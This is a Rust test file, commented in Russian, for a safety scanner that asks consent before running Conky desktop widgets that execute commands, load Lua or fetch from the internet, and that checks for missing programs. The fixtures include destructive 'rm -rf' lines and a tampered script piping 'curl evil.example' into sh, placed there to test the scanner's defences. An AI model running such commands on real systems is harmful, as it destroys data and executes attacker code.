//! Сверка «опасных директив» виджета Conky (план паритета с Conky Manager,
//! п.42): перед ПЕРВЫМ запуском виджет, который выполняет команды, грузит
//! Lua-сценарии или ходит в интернет, спрашивает разрешения; ответ «да»
//! помнится по отпечатку файлов виджета, и после их правки вопрос
//! возвращается.
//!
//! Машина — подставной `LookIo` в памяти: дерево виджетов лежит в словаре,
//! запись файла разрешений видна сверке.

mod i18n_pin;

use std::cell::RefCell;
use std::collections::BTreeMap;

use rexon_core::animations::LookIo;
use rexon_core::conky_safety::{self as cs, RiskKind};
use rexon_core::de_apply::Ctx;

/// Файлы машины: путь → содержимое (`None` — двоичный, текстом не читается).
struct Machine {
    files: RefCell<BTreeMap<String, Option<String>>>,
    /// Программы, которых нет в PATH.
    missing: RefCell<Vec<String>>,
}

impl Machine {
    fn new(files: &[(&str, &str)]) -> Self {
        let m = Machine { files: RefCell::new(BTreeMap::new()), missing: RefCell::new(Vec::new()) };
        for (p, t) in files {
            m.put(p, t);
        }
        m
    }
    fn put(&self, path: &str, text: &str) {
        self.files.borrow_mut().insert(path.to_string(), Some(text.to_string()));
    }
    fn put_binary(&self, path: &str) {
        self.files.borrow_mut().insert(path.to_string(), None);
    }
}

impl LookIo for Machine {
    fn run(&self, _argv: &[String]) -> (bool, String) {
        (false, String::new())
    }
    fn have(&self, tool: &str) -> bool {
        !self.missing.borrow().iter().any(|t| t == tool)
    }
    fn read(&self, path: &str) -> Option<String> {
        self.files.borrow().get(path).cloned().flatten()
    }
    fn write(&self, path: &str, text: &str) -> bool {
        self.put(path, text);
        true
    }
    fn list_dir(&self, path: &str) -> Vec<String> {
        let prefix = format!("{}/", path.trim_end_matches('/'));
        let mut out: Vec<String> = Vec::new();
        for p in self.files.borrow().keys() {
            if let Some(rest) = p.strip_prefix(&prefix) {
                let name = rest.split('/').next().unwrap_or("").to_string();
                if !name.is_empty() && !out.contains(&name) {
                    out.push(name);
                }
            }
        }
        out.sort();
        out
    }
}

const HOME: &str = "/home/u";
const ROOT: &str = "/home/u/.config/conky";

fn ctx() -> Ctx {
    Ctx { home: HOME.into(), xdg_config_home: None, wayland: false, de: "mate".into() }
}

/// Часы без единой команды.
const CLOCK: &str = r#"conky.config = {
    alignment = 'top_right',
    update_interval = 1,
    -- execi в комментарии не считается: ${execi 10 rm -rf ~}
}
conky.text = [[
${time %H:%M}
]]
"#;

/// Погода и датчики: команды, сценарий Lua и загрузка из интернета.
const WEATHER: &str = r#"conky.config = {
    lua_load = './rings.lua',
    lua_draw_hook_pre = 'main',
}
conky.text = [[
${execi 300 sensors | grep Core}
${texeci 600 ./weather.sh}
${curl https://wttr.in/?format=3 600}
${exec playerctl metadata title}
]]
"#;

const RINGS: &str = r#"
-- os.execute("закомментировано")
function conky_main()
    local f = io.popen("nvidia-smi --query-gpu=temperature.gpu --format=csv")
    os.execute('notify-send hi')
end
"#;

/// Старый синтаксис 1.9: команды после TEXT.
const OLD_SYNTAX: &str = "# старый виджет\n\
# ${exec rm -rf /} — комментарий\n\
alignment top_left\n\
lua_load ~/.config/conky/old/draw.lua\n\
TEXT\n\
${execpi 60 ~/.config/conky/old/cal.sh}\n\
${rss https://example.org/feed.xml 30 item_titles 5}\n";

fn widget_machine() -> Machine {
    let m = Machine::new(&[
        (&format!("{ROOT}/clock/conky.conf"), CLOCK),
        (&format!("{ROOT}/weather/conky.conf"), WEATHER),
        (&format!("{ROOT}/weather/rings.lua"), RINGS),
        (&format!("{ROOT}/weather/weather.sh"), "#!/bin/sh\ncurl -s wttr.in\n"),
        (&format!("{ROOT}/old/.conkyrc"), OLD_SYNTAX),
        (&format!("{ROOT}/old/draw.lua"), "function conky_draw() end\n"),
    ]);
    m.put_binary(&format!("{ROOT}/weather/bg.png"));
    m
}

#[test]
fn safe_widget_asks_nothing() {
    let _lang = i18n_pin::en();
    let m = widget_machine();
    assert!(cs::scan_widget(&m, &ctx(), "clock").is_empty());
    assert_eq!(cs::start_question(&m, &ctx(), "clock"), None);
    assert_eq!(cs::start_refusal(&m, &ctx(), "clock"), None);
}

#[test]
fn scanner_finds_execi_lua_load_and_curl() {
    let _lang = i18n_pin::en();
    let m = widget_machine();
    let risks = cs::scan_widget(&m, &ctx(), "weather");
    let has = |kind: RiskKind, what: &str| risks.iter().any(|r| r.kind == kind && r.what == what);
    assert!(has(RiskKind::Command, "sensors | grep Core"), "{risks:#?}");
    assert!(has(RiskKind::Command, "./weather.sh"), "{risks:#?}");
    assert!(has(RiskKind::Command, "playerctl metadata title"), "{risks:#?}");
    assert!(has(RiskKind::LuaScript, "./rings.lua"), "{risks:#?}");
    assert!(has(RiskKind::Network, "https://wttr.in/?format=3"), "{risks:#?}");
    // Команды из самого сценария Lua — с файлом, где они стоят.
    assert!(
        risks.iter().any(|r| r.kind == RiskKind::Command
            && r.what.starts_with("nvidia-smi")
            && r.file == "rings.lua"),
        "{risks:#?}"
    );
    assert!(has(RiskKind::Command, "notify-send hi"), "{risks:#?}");
    // Закомментированное в Lua не считается.
    assert!(!risks.iter().any(|r| r.what.contains("закомментировано")), "{risks:#?}");
}

#[test]
fn old_syntax_is_scanned_too_and_comments_skipped() {
    let _lang = i18n_pin::en();
    let m = widget_machine();
    let risks = cs::scan_widget(&m, &ctx(), "old");
    let whats: Vec<&str> = risks.iter().map(|r| r.what.as_str()).collect();
    assert!(whats.contains(&"~/.config/conky/old/cal.sh"), "{whats:?}");
    assert!(whats.contains(&"~/.config/conky/old/draw.lua"), "{whats:?}");
    assert!(whats.contains(&"https://example.org/feed.xml"), "{whats:?}");
    assert!(!whats.iter().any(|w| w.contains("rm -rf")), "{whats:?}");
}

#[test]
fn question_lists_what_the_widget_runs() {
    let _lang = i18n_pin::en();
    let m = widget_machine();
    let (title, text) = cs::start_question(&m, &ctx(), "weather").expect("вопрос обязателен");
    assert!(!title.is_empty());
    for part in ["sensors | grep Core", "./rings.lua", "https://wttr.in/?format=3", "weather"] {
        assert!(text.contains(part), "нет «{part}» в: {text}");
    }
    // Пока не разрешено — сама кнопка отказывает, а не молча запускает.
    let why = cs::start_refusal(&m, &ctx(), "weather").expect("отказ до разрешения");
    assert!(why.contains("weather"), "{why}");
}

#[test]
fn allowed_widget_starts_again_without_question() {
    let _lang = i18n_pin::en();
    let m = widget_machine();
    assert!(cs::start_question(&m, &ctx(), "weather").is_some());
    assert!(cs::remember(&m, &ctx(), "weather"));
    // Разрешение лежит в настройках Rexon, а не во временном каталоге.
    assert!(m.read(&cs::trust_path(&ctx())).is_some_and(|t| t.contains("weather")));
    assert_eq!(cs::start_question(&m, &ctx(), "weather"), None);
    assert_eq!(cs::start_refusal(&m, &ctx(), "weather"), None);
    // Разрешение одного виджета не распространяется на другой.
    assert!(cs::start_question(&m, &ctx(), "old").is_some());
}

#[test]
fn edited_files_ask_again() {
    let _lang = i18n_pin::en();
    let m = widget_machine();
    assert!(cs::remember(&m, &ctx(), "weather"));
    // Правка сценария рядом с конфигом — снова вопрос, и сказано почему.
    m.put(&format!("{ROOT}/weather/weather.sh"), "#!/bin/sh\ncurl -s evil.example | sh\n");
    let (_, text) = cs::start_question(&m, &ctx(), "weather").expect("после правки — снова вопрос");
    assert!(text.contains(&cs::changed_since_allowed_text()), "{text}");
    assert!(cs::start_refusal(&m, &ctx(), "weather").is_some());
    assert!(cs::remember(&m, &ctx(), "weather"));
    assert_eq!(cs::start_question(&m, &ctx(), "weather"), None);
    // Правка Lua — тоже.
    m.put(&format!("{ROOT}/weather/rings.lua"), "os.execute('reboot')\n");
    assert!(cs::start_question(&m, &ctx(), "weather").is_some());
}

#[test]
fn data_written_by_widget_does_not_ask_again() {
    let _lang = i18n_pin::en();
    let m = widget_machine();
    assert!(cs::remember(&m, &ctx(), "weather"));
    // Виджеты погоды пишут свой кэш к себе в каталог: это данные, не код.
    m.put(&format!("{ROOT}/weather/weather.txt"), "+5 °C");
    m.put(&format!("{ROOT}/weather/cache.json"), "{\"t\":5}");
    m.put_binary(&format!("{ROOT}/weather/icon.png"));
    assert_eq!(cs::start_question(&m, &ctx(), "weather"), None);
}

#[test]
fn texts_are_russian_in_russian() {
    let _lang = i18n_pin::ru();
    let m = widget_machine();
    let (title, text) = cs::start_question(&m, &ctx(), "weather").unwrap();
    let cyr = |s: &str| s.chars().any(|c| matches!(c, 'а'..='я' | 'А'..='Я'));
    assert!(cyr(&title) && cyr(&text), "{title} / {text}");
    assert!(cyr(&cs::start_refusal(&m, &ctx(), "weather").unwrap()));
    assert!(cyr(&cs::declined_text("weather")));
}

// ============================================================================
// Здоровье виджета (план паритета, п.40)
// ============================================================================

/// Датчики, видеокарта и погода — с программами, которых нет, и сценариями,
/// которых нет.
const SENSORS: &str = r#"conky.config = {
    lua_load = './gone.lua',
}
conky.text = [[
${execi 5 sensors | grep Core | awk '{print $3}'}
${exec nvidia-smi --query-gpu=temperature.gpu --format=csv,noheader}
${texeci 600 LANG=C ./weather.sh}
${exec ./missing.sh}
${execi 60 if true; then echo ok; fi}
]]
"#;

fn sick_machine(missing: &[&str]) -> Machine {
    let m = widget_machine();
    m.put(&format!("{ROOT}/sensors/conky.conf"), SENSORS);
    m.put(&format!("{ROOT}/sensors/weather.sh"), "#!/bin/sh\nwget -qO- wttr.in\n");
    *m.missing.borrow_mut() = missing.iter().map(|s| s.to_string()).collect();
    m
}

#[test]
fn health_names_sensors_package_for_each_family() {
    let _lang = i18n_pin::en();
    let m = sick_machine(&["sensors", "nvidia-smi"]);
    for (family, package) in [("arch", "lm_sensors"), ("debian", "lm-sensors"), ("fedora", "lm_sensors"), ("suse", "sensors")] {
        let h = cs::health(&m, &ctx(), "sensors", family);
        assert!(
            h.missing_programs.contains(&cs::MissingProgram { program: "sensors".into(), package: Some(package.into()), aur: None }),
            "{family}: {h:#?}"
        );
        // nvidia-smi приходит с драйвером — пакета не предлагаем.
        assert!(
            h.missing_programs.contains(&cs::MissingProgram { program: "nvidia-smi".into(), package: None, aur: None }),
            "{family}: {h:#?}"
        );
        // Есть в PATH, встроенные слова оболочки и присваивания — не программы.
        let names: Vec<&str> = h.missing_programs.iter().map(|p| p.program.as_str()).collect();
        assert_eq!(names.len(), 2, "{names:?}");
        assert_eq!(h.packages(), vec![package.to_string()]);
        assert_eq!(h.missing_files, vec!["./gone.lua".to_string(), "./missing.sh".to_string()], "{h:#?}");
    }
    // Незнакомое семейство — программа названа, пакет нет.
    let h = cs::health(&m, &ctx(), "sensors", "nix");
    assert!(h.packages().is_empty(), "{h:#?}");
}

#[test]
fn healthy_widget_needs_nothing() {
    let _lang = i18n_pin::en();
    let m = sick_machine(&["sensors"]);
    let h = cs::health(&m, &ctx(), "clock", "arch");
    assert!(h.is_fine(), "{h:#?}");
    assert_eq!(cs::start_plan("clock", &h, true), cs::StartPlan::Go);
    assert_eq!(cs::files_note(&h), None);
    // Всё на месте — и у виджета с командами вопроса нет.
    let m = widget_machine();
    m.put(&format!("{ROOT}/weather/rings.lua"), "function conky_main() end\n");
    assert!(cs::health(&m, &ctx(), "weather", "arch").missing_programs.is_empty());
}

#[test]
fn repo_packages_install_without_question_only_where_rexon_can() {
    let _lang = i18n_pin::en();
    let m = sick_machine(&["sensors"]);
    let h = cs::health(&m, &ctx(), "sensors", "arch");
    // Пакет из репозиториев ставится сам — вопроса «Да/Нет» нет.
    assert_eq!(cs::start_plan("sensors", &h, true), cs::StartPlan::Install(vec!["lm_sensors".to_string()]));
    // Недостающие файлы пакетом не поставить — примечанием к итогу.
    assert!(cs::files_note(&h).is_some_and(|n| n.contains("./gone.lua")));
    // SteamOS и неизменяемые системы: ставить нельзя — виджет не
    // запускается, и сказано, что поставить самому.
    let cs::StartPlan::Refuse(text) = cs::start_plan("sensors", &h, false) else { panic!("должен быть отказ") };
    assert!(text.contains("wasn't started") && text.contains("Install sensors yourself"), "{text}");
}

#[test]
fn program_without_package_refuses_start_without_password() {
    let _lang = i18n_pin::en();
    // nvidia-smi приходит с драйвером: ставить нечего, а lm_sensors ради
    // виджета, который всё равно не запустится, пароль не спрашивает.
    let m = sick_machine(&["sensors", "nvidia-smi"]);
    let h = cs::health(&m, &ctx(), "sensors", "arch");
    let cs::StartPlan::Refuse(text) = cs::start_plan("sensors", &h, true) else { panic!("должен быть отказ") };
    for part in ["The widget “sensors” wasn't started", "without the programs sensors, nvidia-smi", "Install nvidia-smi yourself"] {
        assert!(text.contains(part), "нет «{part}» в: {text}");
    }
    assert!(!text.contains("password"), "{text}");
}

#[test]
fn canceled_install_refuses_start_and_says_how_to_retry() {
    let _lang = i18n_pin::en();
    let m = visualizer_machine();
    let h = cs::health(&m, &ctx(), "eq", "arch");
    assert_eq!(cs::start_plan("eq", &h, true), cs::StartPlan::Install(vec!["cava".to_string()]));
    // Пароль polkit отменён: виджет НЕ запускается, в итоге — почему и как
    // поставить ещё раз; причину «пароль не подтверждён» не повторяем.
    let canceled = Err(rexon_core::appearance_installer::password_not_confirmed());
    let cs::StartPlan::Refuse(text) = cs::after_install("eq", &h, &h, &canceled) else { panic!("должен быть отказ") };
    assert_eq!(
        text,
        "The widget “eq” wasn't started: without the program cava it doesn't fully work. \
         Press “▶️ Start” again and enter the password to install it."
    );
    // Ошибка менеджера пакетов — с причиной.
    let cs::StartPlan::Refuse(text) = cs::after_install("eq", &h, &h, &Err("the package manager reported an error".into())) else {
        panic!("должен быть отказ")
    };
    assert!(text.contains("Installation failed: the package manager reported an error."), "{text}");
    // Встало, и программа на диске — запуск.
    assert_eq!(cs::after_install("eq", &h, &cs::Health::default(), &Ok(())), cs::StartPlan::Go);
    // Пакет «встал», а программы нет — не запуск.
    assert!(matches!(cs::after_install("eq", &h, &h, &Ok(())), cs::StartPlan::Refuse(_)));
}

#[test]
fn part_button_refuses_and_points_to_the_tile() {
    let _lang = i18n_pin::en();
    let m = visualizer_machine();
    let h = cs::health(&m, &ctx(), "eq", "arch");
    let text = cs::part_refusal("eq", &h, true).expect("отказ части");
    assert!(text.contains("Start the widget with “▶️ Start” on its tile"), "{text}");
    assert_eq!(cs::part_refusal("eq", &cs::Health::default(), true), None);
}

#[test]
fn package_table_for_widget_programs() {
    assert_eq!(cs::program_package("wget", "fedora").as_deref(), Some("wget2-wget"));
    assert_eq!(cs::program_package("wget", "debian").as_deref(), Some("wget"));
    assert_eq!(cs::program_package("sensors", "suse").as_deref(), Some("sensors"));
    assert_eq!(cs::program_package("nvidia-smi", "arch"), None);
    assert_eq!(cs::program_package("sensors", "nix"), None);
}

/// Эквалайзер вроде Jhalak: команда для `io.popen` собрана из строк в
/// переменной, программы нет в PATH.
const VISUALIZER: &str = r#"
local CONFIG_FILE = './cava.conf'
local function start_cava()
    local cmd = 'cava -p ' .. CONFIG_FILE .. ' 2>/dev/null'
    cava_pipe = io.popen(cmd, 'r')
end
"#;

fn visualizer_machine() -> Machine {
    let m = Machine::new(&[
        (&format!("{ROOT}/eq/conky.conf"), "conky.config = { lua_load = './visualizer.lua' }\nconky.text = [[ ]]\n"),
        (&format!("{ROOT}/eq/visualizer.lua"), VISUALIZER),
        (&format!("{ROOT}/eq/cava.conf"), "[general]\nbars = 64\n"),
    ]);
    *m.missing.borrow_mut() = vec!["cava".to_string()];
    m
}

#[test]
fn command_built_from_lua_strings_is_shown_and_checked() {
    let _lang = i18n_pin::en();
    let m = visualizer_machine();
    // В вопросе — сама команда, а не «io.popen(cmd, 'r')».
    let risks = cs::scan_widget(&m, &ctx(), "eq");
    assert!(
        risks.iter().any(|r| r.kind == RiskKind::Command && r.what == "cava -p ./cava.conf 2>/dev/null"),
        "{risks:#?}"
    );
    // Недостающая программа найдена, пакет — из репозиториев семейства.
    for family in ["arch", "debian", "fedora", "suse"] {
        let h = cs::health(&m, &ctx(), "eq", family);
        assert_eq!(
            h.missing_programs,
            vec![cs::MissingProgram { program: "cava".into(), package: Some("cava".into()), aur: None }],
            "{family}"
        );
        assert!(h.missing_files.is_empty(), "{family}: {h:#?}");
    }
    assert_eq!(cs::start_plan("eq", &cs::health(&m, &ctx(), "eq", "arch"), true), cs::StartPlan::Install(vec!["cava".to_string()]));
}

#[test]
fn aur_only_program_is_named_with_its_aur_package() {
    let _lang = i18n_pin::en();
    // xdg-terminal-exec в Arch есть только в AUR: Rexon его не ставит, но
    // говорит, откуда его взять.
    let m = Machine::new(&[(&format!("{ROOT}/term/conky.conf"), "conky.text = [[ ${exec xdg-terminal-exec htop} ]]\n")]);
    *m.missing.borrow_mut() = vec!["xdg-terminal-exec".to_string()];
    let h = cs::health(&m, &ctx(), "term", "arch");
    assert_eq!(
        h.missing_programs,
        vec![cs::MissingProgram { program: "xdg-terminal-exec".into(), package: None, aur: Some("xdg-terminal-exec".into()) }]
    );
    // Пакет только из AUR сам не ставится: сборка из AUR без вопроса
    // недопустима.
    assert!(h.packages().is_empty());
    // Виджет не запускается, и сказано, как поставить из AUR самому.
    let cs::StartPlan::Refuse(text) = cs::start_plan("term", &h, true) else { panic!("должен быть отказ") };
    assert_eq!(
        text,
        "The widget “term” wasn't started: without the program xdg-terminal-exec it doesn't fully work. \
         xdg-terminal-exec is only in the AUR — install it (for example, yay -S xdg-terminal-exec) and \
         start the widget again."
    );
    // В Debian пакет есть в репозиториях — про AUR ни слова.
    let h = cs::health(&m, &ctx(), "term", "debian");
    assert_eq!(h.missing_programs[0].aur, None);
    assert_eq!(cs::program_aur_package("xdg-terminal-exec", "debian"), None);
}

#[test]
fn health_texts_are_russian_in_russian() {
    let _lang = i18n_pin::ru();
    let m = visualizer_machine();
    let h = cs::health(&m, &ctx(), "eq", "arch");
    let canceled = Err(rexon_core::appearance_installer::password_not_confirmed());
    let cs::StartPlan::Refuse(text) = cs::after_install("eq", &h, &h, &canceled) else { panic!("должен быть отказ") };
    assert_eq!(
        text,
        "Виджет «eq» не запущен: без программы cava он работает не полностью. \
         Нажмите «▶️ Запустить» ещё раз и введите пароль, чтобы её установить."
    );
    let aur = cs::Health {
        missing_files: vec!["./a.lua".into()],
        missing_programs: vec![cs::MissingProgram { program: "cava".into(), package: None, aur: Some("cava-git".into()) }],
    };
    let cs::StartPlan::Refuse(text) = cs::start_plan("eq", &aur, true) else { panic!("должен быть отказ") };
    assert!(text.ends_with("cava есть только в AUR — установите её (например, yay -S cava-git) и запустите виджет снова."), "{text}");
    let r = cs::prepare_start(&m, &ctx(), &["eq".to_string()], "arch", true, cs::Retry::Set, &|_| canceled.clone());
    assert_eq!(
        r,
        [Err("Виджет «eq» не запущен: без программы cava он работает не полностью. \
              Примените набор ещё раз и введите пароль, чтобы её установить."
            .to_string())]
    );
    let cyr = |s: &str| s.chars().any(|c| matches!(c, 'а'..='я' | 'А'..='Я'));
    assert!(cyr(&cs::files_note(&aur).unwrap()));
    assert!(cyr(&cs::part_refusal("eq", &h, true).unwrap()));
}

/// Общий путь «всё или ничего» для набора (и плитки): недостающие пакеты
/// всех виджетов — одной установкой, без повторов; что не встало или чего
/// не поставить — этот виджет не запускается, остальные идут.
#[test]
fn set_installs_once_and_refuses_only_the_sick_widget() {
    let _lang = i18n_pin::en();
    let m = sick_machine(&["cava", "sensors", "nvidia-smi"]);
    m.put(&format!("{ROOT}/eq/conky.conf"), "conky.config = { lua_load = './visualizer.lua' }\nconky.text = [[ ]]\n");
    m.put(&format!("{ROOT}/eq/visualizer.lua"), VISUALIZER);
    m.put(&format!("{ROOT}/eq2/conky.conf"), "conky.config = { lua_load = './visualizer.lua' }\nconky.text = [[ ]]\n");
    m.put(&format!("{ROOT}/eq2/visualizer.lua"), VISUALIZER);
    for w in ["eq", "eq2"] {
        m.put(&format!("{ROOT}/{w}/cava.conf"), "[general]\nbars = 64\n");
    }
    let ids: Vec<String> = ["eq", "sensors", "clock", "eq2"].map(String::from).to_vec();
    let calls = RefCell::new(Vec::<Vec<String>>::new());
    let install = |packages: &[String]| {
        calls.borrow_mut().push(packages.to_vec());
        m.missing.borrow_mut().retain(|p| !packages.contains(p));
        Ok(())
    };
    let r = cs::prepare_start(&m, &ctx(), &ids, "arch", true, cs::Retry::Set, &install);
    // sensors всё равно не запустится (nvidia-smi не поставить) — его
    // lm_sensors пароль не спрашивает; cava двух эквалайзеров — один раз.
    assert_eq!(*calls.borrow(), [vec!["cava".to_string()]]);
    assert_eq!(r.len(), 4);
    assert_eq!(r[0], Ok(None));
    let Err(text) = &r[1] else { panic!("sensors должен получить отказ: {r:?}") };
    assert!(text.contains("The widget “sensors” wasn't started") && text.contains("Install nvidia-smi yourself"), "{text}");
    assert_eq!(r[2], Ok(None));
    assert_eq!(r[3], Ok(None));

    // Пароль не подтверждён — эквалайзер не запускается, и сказано, что
    // повторить надо «Применить» набора; часы идут.
    let m = visualizer_machine();
    m.put(&format!("{ROOT}/clock/conky.conf"), CLOCK);
    let canceled = |_: &[String]| Err(rexon_core::appearance_installer::password_not_confirmed());
    let ids: Vec<String> = ["eq", "clock"].map(String::from).to_vec();
    let r = cs::prepare_start(&m, &ctx(), &ids, "arch", true, cs::Retry::Set, &canceled);
    assert_eq!(
        r[0],
        Err("The widget “eq” wasn't started: without the program cava it doesn't fully work. \
             Apply the set again and enter the password to install it."
            .to_string())
    );
    assert_eq!(r[1], Ok(None));
    // Ставить нечего — установка не зовётся вовсе.
    let never = |_: &[String]| -> Result<(), String> { panic!("установка не нужна") };
    assert_eq!(cs::prepare_start(&m, &ctx(), &["clock".to_string()], "arch", true, cs::Retry::Tile, &never), [Ok(None)]);
}

/// «Запускать при входе»: при входе виджет запустится без Rexon, поэтому
/// включение идёт тем же путём «всё или ничего»; отказ подсказывает
/// включить переключатель ещё раз.
#[test]
fn autostart_switch_checks_programs_too() {
    let _lang = i18n_pin::en();
    let m = visualizer_machine();
    let canceled = |_: &[String]| Err(rexon_core::appearance_installer::password_not_confirmed());
    let r = cs::prepare_start(&m, &ctx(), &["eq".to_string()], "arch", true, cs::Retry::Autostart, &canceled);
    assert_eq!(
        r,
        [Err("The widget “eq” wasn't started: without the program cava it doesn't fully work. \
              Turn on “Start at login” again and enter the password to install it."
            .to_string())]
    );
}
